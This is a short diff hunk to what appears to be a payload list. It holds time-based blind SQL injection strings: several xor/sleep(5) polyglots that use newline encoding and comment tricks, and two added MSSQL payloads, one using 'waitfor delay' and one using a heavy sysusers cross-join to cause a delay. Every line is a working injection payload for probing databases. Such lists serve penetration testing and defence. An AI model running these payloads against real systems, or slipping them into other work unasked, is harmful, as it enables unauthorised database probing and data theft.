@@ -9,3 +9,7 @@ payload
 `11%0axor(sleep(5))%23'xor(sleep(5))%23"xor(sleep(5))%23'`
 `5%0axor%0asleep(5)/*'xor%0asleep(5)xor%0a'"xor%0asleep(5)xor%0a"*/`
 `5%0a-%0asleep(5)/*'-%0asleep(5)-%0a'"-%0asleep(5)-%0a"*/`
+
+`') waitfor delay '0:0:5' --`
+
+` and 1733=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7,sysusers AS sys8,sysusers AS sys9)  -- ' and 1= (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7,sysusers AS sys8,sysusers AS sys9) -- s`
